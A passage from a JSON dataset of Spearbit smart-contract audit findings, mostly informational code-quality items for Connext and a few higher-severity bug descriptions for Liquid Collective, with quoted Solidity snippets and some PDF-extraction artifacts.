"labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "SafeMath is not required for Solidity 0.8.x", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Solidity 0.8.x has a built-in mechanism for dealing with overflows and underflows, so there is no need to use the SafeMath library", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Use a deadline check modifier in ProposedOwnable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Any change in ownership through acceptProposedOwner() and renounceOwnership() has to go through a deadline check: // Ensure delay has elapsed if ((block.timestamp - _proposedOwnershipTimestamp) <= _delay) revert ProposedOwnable__acceptProposedOwner_delayNotElapsed(); This check can be extracted out in a modifier for readability.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Use ExcessivelySafeCall in SpokeConnector", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The low-level call code highlighted code above looks to be copied from ExcessivelySafeCall.sol. replacing this low-level call with the function call ExcessivelySafe- Consider", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "s.LIQUIDITY_FEE_NUMERATOR might change while a cross-chain transfer is in-flight", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "s.LIQUIDITY_FEE_NUMERATOR might change while a cross-chain transfer is in-flight.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "The constant expression for EMPTY_HASH can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "EMPTY_HASH is a constant with a value equal to: hex\"c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470\", which is the keccak256 of an empty bytes. We can replace this constant hex literal with a more readable alternative.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Simplify and add more documentation for getTokenPrice", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "getTokenPrice can be simplified and it can try to return early whenever possible.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Remove unused code, files, interfaces, libraries, contracts, ...", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The codebase includes code, files, interfaces, libraries, and contracts that are no longer in use.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "_calculateSwapInv and _calculateSwap can mirror each other's calculations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "_calculateSwapInv could have mirrored the implementation of _calculateSwap uint256 y = xp[tokenIndexTo] - (dy * multipliers[tokenIndexTo]); uint256 x = getY(_getAPrecise(self), tokenIndexTo, tokenIndexFrom, y, xp); Or the other way around _calculateSwap mirror _calculateSwapInv and pick whatever is cheaper.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document that the virtual price of a stable swap pool might not be constant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The virtual price of the LP token is not constant when the amplification coefficient is ramping even when/if token balances stay the same.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document the reason for picking d is the starting point for calculating getYD using the Newton's method.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "d the stable swap invariant passed to getYD as a parameter and it is used as the starting point of the Newton method to find a root. This root is the value/price for the tokenIndex token that would stabilize the pool so that it would statisfy the stable swap invariant equation.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document the max allowed tokens in stable swap pools used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Based on the uint8 type for the indexes of tokens in different stable swap pools, it is inferred that the max possible number of tokens that can exist in a pool is 256. There is the following check when initializing internal pools: if (_pooledTokens.length <= 1 || _pooledTokens.length > 32) revert SwapAdminFacet__initializeSwap_invalidPooledTokens(); This means the internal pools can only have number of pooled tokens in 2, (cid:1) (cid:1) (cid:1) , 32.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Rename adoptedToLocalPools to better indicate what it represents", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "adoptedToLocalPools is used to keep track of external pools where one can swap between different variations of a token. But one might confuse this mapping as holding internal stable swap pools.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document the usage of commented mysterious numbers in AppStorage", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Before each struct AppStorage's field definition there is a line comment consisting of only digits // xx One would guess they might be relative slot indexes in the storage (relative to AppStorage's slot). But the numbers are not consistent.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "RouterPermissionsManagerInfo can be packed differently for readability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "RouterPermissionsManagerInfo has multiple fields that are each a mapping of address to a differ- ent value. The address here represents a liquidity router address. It would be more readable to pack these values such that only one mapping is used. This would also indicate how all these mapping have the same shared key which is the router.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Consolidate TokenId struct into a file that can be imported in relevant files", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "TokenId struct is defined both in BridgeMessage and LibConnextStorage with the same struc- ture/fields. If in future, one would need to update one struct the other one should also be updated in parallel.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Typos, grammatical and styling errors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "There are a few typos and grammatical mistakes that can be corrected in the codebase.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Keep consistent return parameters in calculateSwapToLocalAssetIfNeeded", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "All return paths in calculateSwapToLocalAssetIfNeeded except one return _local as the 2nd return parameter. It would be best for readability and consistency change the following code to follow the same pattern if (_asset == _local) { return (_amount, _asset); }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Fix/add or complete missing NatSpec comments.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Some NatSpec comments are either missing or are incomplete.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Define and use constants for different literals used in the codebase.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Throughout the project, a few literals have been used. It would be best to define a named constant for those. That way it would be more clear the purpose of those values used and also the common literals can be consolidated into one place.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Enforce using adopted for the returned parameter in swapFromLocalAssetIfNeeded... for consis- tency.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The other return paths in swapFromLocalAssetIfNeeded, swapFromLocalAssetIfNeededForEx- actOut and calculateSwapFromLocalAssetIfNeeded use the adopted parameter as one of the return value com- ponents. It would be best to have all the return paths do the same thing. Note swapFromLocalAssetIfNeeded and calculateSwapFromLocalAssetIfNeeded should always return (_, adopted) and swapFromLocalAssetIfNeededForExactOut should always return (_, _, adopted).", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Use interface types for parameters instead of casting to the interface type multiple times", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Sometimes casting to the interface type has been performed multiple times. It will be cleaner if the parameter is defined as having that interface and avoid unnecessary casts.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Be aware of tokens with multiple addresses", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "If a token has multiple addresses (see weird erc20) then the token cap might have an unexpected effect, especially if the two addresses have a different cap. function _addLiquidityForRouter(...) ... { ... if (s.domain == canonical.domain) { // Sanity check: caps not reached uint256 custodied = IERC20(_local).balanceOf(address(this)) + _amount; uint256 cap = s.caps[key]; if (cap > 0 && custodied > cap) { revert RoutersFacet__addLiquidityForRouter_capReached(); } } ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Remove old references to claims", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The contract RelayerFacet still has some references to claims. These are a residue from a previous version and are not used currently. error RelayerFacet__initiateClaim_emptyClaim(); error RelayerFacet__initiateClaim_notRelayer(bytes32 transferId); event InitiatedClaim(uint32 indexed domain, address indexed recipient, address caller, bytes32[] transferIds); ,! event Claimed(address indexed recipient, uint256 total, bytes32[] transferIds);", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Doublecheck references to Nomad", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The code refers to nomad several times in a way that is currently not accurate. This could be confusing to the maintainers and readers of the code. This includes the following examples: BridgeFacet.sol:419: * @notice Initiates a cross-chain transfer of funds, calldata, and/or various named properties using the nomad ,! BridgeFacet.sol:423: * assets will be swapped for their local nomad asset counterparts (i.e. bridgeable tokens) via the configured AMM if swap is needed. The local tokens will * necessary. In the event that the adopted assets *are* local nomad assets, no ,! BridgeFacet.sol:424: ,! InboxFacet.sol:87: RoutersFacet.sol:533: AssetLogic.sol:102: asset. ,! AssetLogic.sol:139: swap ,! AssetLogic.sol:185: swap ,! AssetLogic.sol:336: adopted asset ,! AssetLogic.sol:375: * @notice Only accept messages from an Nomad Replica contract. * @param _local - The address of the nomad representation of the asset * @notice Swaps an adopted asset to the local (representation or canonical) nomad * @notice Swaps a local nomad asset for the adopted asset using the stored stable * @notice Swaps a local nomad asset for the adopted asset using the stored stable * @notice Calculate amount of tokens you receive on a local nomad asset for the * @notice Calculate amount of tokens you receive of a local nomad asset for the adopted asset ,! LibConnextStorage.sol:54: * @param receiveLocal - If true, will use the local nomad asset on the destination instead of adopted. ,! LibConnextStorage.sol:148: madUSDC on polygon). ,! LibConnextStorage.sol:204: LibConnextStorage.sol:268: madUSDC on polygon) * @dev Swaps for an adopted asset <> nomad local asset (i.e. POS USDC <> * this domain (the nomad local asset). * @dev Swaps for an adopted asset <> nomad local asset (i.e. POS USDC <> ,! ConnectorManager.sol:11: * @dev Each nomad router contract has a `XappConnectionClient`, which ,! references a 142", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document usage of Nomad domain schema", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The library LibConnextStorage specifies that the domains are compatible with the nomad domain schema. However other locations don't mention this. This is especially important during the enrollment of new domains. * @param originDomain - The originating domain (i.e. where `xcall` is called). Must match nomad domain schema ,! * @param destinationDomain - The final domain (i.e. where `execute` / `reconcile` are called). Must match nomad domain schema ,! struct TransferInfo { uint32 originDomain; uint32 destinationDomain; ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Router has multiple meanings", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The term router is used for three different concepts. This is confusing for maintainers and readers of the code: A) The router that provides Liquidity and signs bids * `router` - this is the address that will sign bids sent to the sequencer B) The router that can add new routers of type A (B is a role and the address could be a multisig) /// @notice Enum representing address role enum Role { None, Router, Watcher, Admin } C) The router that what previously was BridgeRouter or xApp Router: * @param _router The address of the potential remote xApp Router", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Robustness of receiving contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "In the _reconciled branch of the code, the functions _handleExecuteTransaction(), _execute- Calldata() and excessivelySafeCall() don't revert when the underlying call reverts This seems to be inten- tional. This underlying revert can happen if there is a bug in the underlying call or if insufficient gas is supplied by the relayer. Note: if a delegate address is specified it can retry the call to try and fix temporary issues. The receiving contract already has received the tokens via handleOutgoingAsset() so must be prepared to handle these tokens. This should be explicitly documented. function _handleExecuteTransaction(...) ... { AssetLogic.handleOutgoingAsset(_asset, _args.params.to, _amountOut); _executeCalldata(_transferId, _amountOut, _asset, _reconciled, _args.params); ... } function _executeCalldata(...) ... { if (_reconciled) { ... (success, returnData) = ExcessivelySafeCall.excessivelySafeCall(...); } else { ... } }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Functions can be combined", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Both xcall and xcallIntoLocal have same code except receiveLocal (which is set false for xcall and true for xcallIntoLocal) value. Instead of having these as separate function, a single function can be created which can tweak the functionalities of xcall and xcallIntoLocal on basis of receiveLocal value", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document source of zeroHashes", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The hashes which are used in function zeroHashes() are not explained, which makes it more difficult to understand and verify the code. function zeroHashes() internal pure returns (bytes32[TREE_DEPTH] memory _zeroes) { ... // keccak256 zero hashes bytes32 internal constant Z_0 = hex\"0000000000000000000000000000000000000000000000000000000000000000\"; ... bytes32 internal constant Z_31 = hex\"8448818bb4ae4562849e949e17ac16e0be16688e156b5cf15e098c627c0056a9\"; ,! ,! }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document underflow/overflows in TypedMemView", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function index() has an overflow when _bytes derflow when _len == 0. These two compensate each other so the end result of index() is as expected. As the special case for _bytes == 0 is also handled, we assume this is intentional. However this behavior isn't mentioned in the comments, while other underflow/overflows are documented. library TypedMemView { function index( bytes29 memView, uint256 _index, uint8 _bytes ) internal pure returns (bytes32 result) { ... unchecked { uint8 bitLength = _bytes * 8; } ... } function leftMask(uint8 _len) private pure returns (uint256 mask) { ... mask := sar( sub(_len, 1), ... ... ) } }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Use while loops in dequeueVerified()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Within function dequeueVerified() there are a few for loops that mention a variable as there first element. This is a null statement and can be removed. After removing, only a while condition remains. Replacing the for with a while would make the code more readable. Also (x >= y) can be replaced by (!(x < y)) or (!(y > x)) to save some gas. function dequeueVerified(Queue storage queue, uint256 delay) internal returns (bytes32[] memory) { ... for (last; last >= first; ) { ... } ... for (first; first <= last; ) { ... } }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Duplicate functions in Encoding.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Encoding.sol defines a few functions already present in TypedMemView.sol: nibbleHex(), byte- Hex(), encodeHex().", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document about two MerkleTreeManager's", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "On the hub domain (e.g. mainnet) there are two MerkleTreeManagers, one for the hub and one for the MainnetSpokeConnector. This might not be obvious to the casual readers of the code. Accidentally confusing the two would lead to weird issues.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Match filename to contract name", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Sometimes the name of the .sol file is different than the contract name. Also sometimes multiple contracts are defined in the same file. Additionally there are multiple .sol files with the same name. This makes it more difficult to find the file containing the contract. File: messaging/Merkle.sol contract MerkleTreeManager is ProposedOwnableUpgradeable { ... } File: messaging/libraries/Merkle.sol library MerkleLib { ... } File: ProposedOwnable.sol abstract contract ProposedOwnable is IProposedOwnable { ... } abstract contract ProposedOwnableUpgradeable is Initializable, ProposedOwnable { ... } File: OZERC20.sol 148 contract ERC20 is IERC20, IERC20Permit, EIP712 { ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Use uint40 for type in TypedMemView", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "All internal functions in TypedMemView use uint40 for type except build(). Since internal functions can be called by inheriting contracts, it's better to provide a consistent interface.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Comment in function typeOf() is inaccurate", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "A comment in function typeOf() is inaccurate. It says it is shifting 24 bytes, however it is shifting 216 / 8 = 27 bytes. function typeOf(bytes29 memView) internal pure returns (uint40 _type) { assembly { ... // 216 == 256 - 40 _type := shr(216, memView) // shift out lower 24 bytes } }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Missing Natspec documentation in TypedMemView", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "unsafeJoin()'s Natspec documentation is incomplete as the second argument to function is not documented.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Remove irrelevant comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": " Instance 1 - TypedMemView.sol#L770 clone() has this comment that seems to be copied from equal(). This is not applicable to clone() and can be deleted. * @dev Shortcuts if the pointers are identical, otherwise compares type and digest.  Instance 2 - SpokeConnector.sol#L499 The function process of SpokeConnector contains comments that are no longer relevant. // check re-entrancy guard // require(entered == 1, \"!reentrant\"); // entered = 0; Instance 3 - BridgeFacet.sol#L419 Nomad is no longer used within Connext. However, they are still being mentioned in the comments within the codebase. * @notice Initiates a cross-chain transfer of funds, calldata, and/or various named properties using ,! the nomad * network.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Incorrect comment about TypedMemView encoding", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "A TypedMemView variable of type bytes29 is encoded as follows:  First 5 bytes encode a type flag.  Next 12 bytes point to a memory address.  Next 12 bytes encode the length of the memory view (in bytes).  Next 3 bytes are empty. When shifting a TypedMemView variable to the right by 15 bytes (120 bits), the encoded length and the empty bytes are removed. Hence, this comment is incorrect: // 120 bits = 12 bytes (the encoded loc) + 3 bytes (empty low space) _loc := and(shr(120, memView), _mask)", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Constants can be used in assembly blocks directly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Yul cannot read global variables, but that is not true for a constant variable as its value is embedded in the bytecode. Highlighted code above have the following pattern: uint256 _mask = LOW_12_MASK; // assembly can't use globals assembly { // solium-disable-previous-line no-inline-assembly _len := and(shr(24, memView), _mask) } Here, LOW_12_MASK is a constant which can be used directly in assembly code.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document source of processMessageFromRoot()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function processMessageFromRoot() of ArbitrumHubConnector doesn't contain a comment where it is derived from. Most other functions have a link to the source. Linking to the source would make the function easier to verify and maintain.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Be aware of zombies", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function _validateSendRoot() of ArbitrumHubConnector check that stakerCount and child- StakerCount are larger than 0. The definition of stakerCount and childStakerCount document that they could include zombies. Its not immediately clear what zombies are, but it might be relevant to consider them. contract ArbitrumHubConnector is HubConnector { function _validateSendRoot(...) ... { ... require(node.stakerCount > 0 && node.childStakerCount > 0, \"!staked\"); } } // Number of stakers staked on this node. This includes real stakers and zombies uint64 stakerCount; // Number of stakers staked on a child node. This includes real stakers and zombies uint64 childStakerCount;", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Readability of proveAndProcess()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function proveAndProcess() is relatively difficult to understand because it first processes for the case of i==0 and then does a loop over i==1..._proofs.length. function proveAndProcess(...) ... { ... bytes32 _messageHash = keccak256(_proofs[0].message); bytes32 _messageRoot = calculateMessageRoot(_messageHash, _proofs[0].path, _proofs[0].index); proveMessageRoot(_messageRoot, _aggregateRoot, _aggregatePath, _aggregateIndex); messages[_messageHash] = MessageStatus.Proven; for (uint32 i = 1; i < _proofs.length; ) { _messageHash = keccak256(_proofs[i].message); bytes32 _calculatedRoot = calculateMessageRoot(_messageHash, _proofs[i].path, _proofs[i].index); require(_calculatedRoot == _messageRoot, \"!sharedRoot\"); messages[_messageHash] = MessageStatus.Proven; unchecked { ++i; } } ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Readability of checker()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function checker() is relatively difficult to read due to the else if chaining of if statements. As the if statements call return(), the else isn't necessary and the code can be made more readable. function checker() external view override returns (bool canExec, bytes memory execPayload) { bytes32 outboundRoot = CONNECTOR.outboundRoot(); if ((lastExecuted + EXECUTION_INTERVAL) > block.timestamp) { return (false, bytes(\"EXECUTION_INTERVAL seconds are not passed yet\")); } else if (lastRootSent == outboundRoot) { return (false, bytes(\"Sent root is the same as the current root\")); } else { execPayload = abi.encodeWithSelector(this.sendMessage.selector, outboundRoot); return (true, execPayload); } }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Use function addressToBytes32", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function dispatch() of SpokeConnector contains an explicit conversion from address to bytes32. There is also a function addressToBytes32() that does the same and is more readable. function dispatch(...) ... { bytes memory _message = Message.formatMessage( ... bytes32(uint256(uint160(msg.sender))), ... );", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "_pickNextValidatorsToExitFromActiveOperators uses the wrong index to query stopped validator count for operators", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "operators does not necessarily have the same order as the actual OperatorsV2's operators, since the ones that don't have _hasExitableKeys will be skipped (the operator might not be active or all of its funded keys might have been requested to exit). And so when querying the stopped validator counts for (uint256 idx = 0; idx < exitableOperatorCount;) { uint32 currentRequestedExits = operators[idx].requestedExits; uint32 currentStoppedCount = _getStoppedValidatorsCountFromRawArray(stoppedValidators, idx); one should not use the idx in the cached operator's array, but the cached index of this array element, as the indexes of stoppedValidators correspond to the actual stored operator's array in storage. Note that when emitting the UpdatedRequestedValidatorExitsUponStopped event, the correct index has been used.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Critical Risk"]}, {"title": "Oracles' reports votes are not stored in storage", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The purpose of Oracle.1.sol is to facilitate the reporting and quorum of oracles. Oracles period- ically add their reports and when consensus is reached the setConsensusLayerData function (which is a critical component of the system) is called. However, there is an issue with the current implementation as ReportVari- ants holds the reports made by oracles but ReportVariants.get() returns a memory array instead of a storage array, therefore resulting in an increase in votes that will not be stored at the end of the transaction and prevent- ing setConsensusLayerData from being called. This is a regression bug that should have been detected by a comprehensive test suite.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Critical Risk"]}, {"title": "User's LsETH might be locked due to out-of-gas error during recursive calls", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Let W0, W1, ...W7 represent the withdrawal events in the withdrawal stack. Let R0, R1, R2 represent the users' redeem requests in the redeem queue. Assume that Alice is the owner of R1. When Alice called the resolveRedeemRequests function against R1, it will resolve to W 1. Next, Alice called the _claimRedeemRequest function with R1 and its corresponding W 1. The _claimRedeemRequest will first process W 1. At the end of the function, it will check if W 1 matches all the amounts of R1. If not, it will call the _claimRedeemRequest function recursively with the same request id (R1) but increment the withdrawal event id (W2 = W1 + 1). The _claimRedeemRequest function recursively calls itself until all the amount of redeem request is \"expended\" or the next withdrawal event does not exist. In the above example, the _claimRedeemRequest will be called 7 times with W1...W7, until all the amount of R1 is \"expended\" (R1.amount == 0) However, if the amount of a redeem request is large (e.g. 1000 LsETH), and this redeem request is satisfied by many small chunks of withdrawal events (e.g. one withdrawal event consists of less than 10 LsETH), then the recursion depth will be large. The function will keep calling itself recursively until an out-of-gas error happens. If this happens, there is no way to claim the redemption request, and the user's LsETH will be locked. In the current implementation, users cannot break the claim into smaller chunks to overcome the gas limit. In the above example, if Alice attempts to break the claim into smaller chunks by first calling the _claimRedeemRequest function with R1 and its corresponding W5, the _isMatch function within it will revert.", "labels": ["Spearbit", "LiquidCollective3", "Severity: High Risk"]}, {"title": "Allowed users can directly transfer their share to RedeemManager", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "An allowed user can directly transfer its shares to the RedeemManager without requesting a redeem. This would cause the withdrawal stack to grow, since the redeem demand (2) which is calculated based on the RedeemManager's share of LsETH increases. RedeemQueue would be untouched in this case. In case of an accidental mistake by a user, the locked shares can only be retrieved by a protocol update.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Medium Risk"]}, {"title": "Invariants are not enforced for stopped validator counts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "_setStoppedValidatorCounts does not enforce the following invariants:  stoppedValidatorCounts[0] <= DepositedValidatorCount.get()  stoppedValidatorCounts[i] needs to be a non-decreasing function when viewed on a timeline  stoppedValidatorCounts[i] needs to be less than or equal to the funded number of validators for the corresponding operator. Currently, the oracle members can report values that would break these invariants. As a consequence, the oracle members can signal the operators to exit more or fewer validators by manipulating the preExitingBalance value. And activeCount for exiting validators picking algorithm can also be manipulated per operator.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Medium Risk"]}, {"title": "Potential out of gas exceptions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The purpose of _requestExitsBasedOnRedeemDemandAfterRebalancings is to release liquidity for withdrawals made in the RedeemManager contract. The function prioritizes liquidity sources, starting with Balance- ToRedeem and then BalanceToDeposit, before asking validators to exit. However, if the validators are needed to release more liquidity, the function uses pickNextValidatorsToExit to determine which validators to ask to exit. This process can be quite gas-intensive, especially if the number of validators is large. The gas consumption of this function depends on several factors, including exitableOperatorCount, stoppedVal- idators.length, and the rate of decrease of _count. These factors may increase over time, and the msg.sender does not have control over them. The function includes two nested loops that contribute to the overall gas con- sumption, and this can be problematic for certain inputs. For example, if the operators array has no duplications and the difference between values is exactly 1, such as [n, n-1, n-2 ... n-k] where n can be any number and k is a large number equals exitableOperatorCount - 1 and _count is also large, the function can become extremely gas-intensive. The main consequence of such a potential issue is that the function may not release enough liquidity to the RedeemManager contract, resulting in partial fulfillment of redemption requests. Similarly, _pickNextValidatorsToDepositFromActiveOperators is also very gas intensive. If the number of de- sired validators and current operators (including fundable operators) are high enough, depositToConsensusLayer is no longer callable.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Medium Risk"]}, {"title": "The validator count to exit in _requestExitsBasedOnRedeemDemandAfterRebalancings assumes that the to-be selected validators are still active and have not been penalised.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The validatorCountToExit is calculated as follows uint256 validatorCountToExit = LibUint256.ceil( redeemManagerDemandInEth - (availableBalanceToRedeem + exitingBalance + preExitingBalance), DEPOSIT_SIZE ); This formula assumes that the to-be selected validators exit by the pickNextValidatorsToExit are: 1. Still active 2. Have not been queued to be exited and 3. Have not been penalized and their balance is at least MAX_EFFECTIVE_BALANCE", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Burn RedeemManager's share first before calling its reportWithdraw endpoint", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "reportWithdraw and then burns the corresponding shares for the RedeemManager The current implementation of _reportWithdrawToRedeemManager calls RedeemManager's // perform a report withdraw call to the redeem manager redeemManager_.reportWithdraw{value: 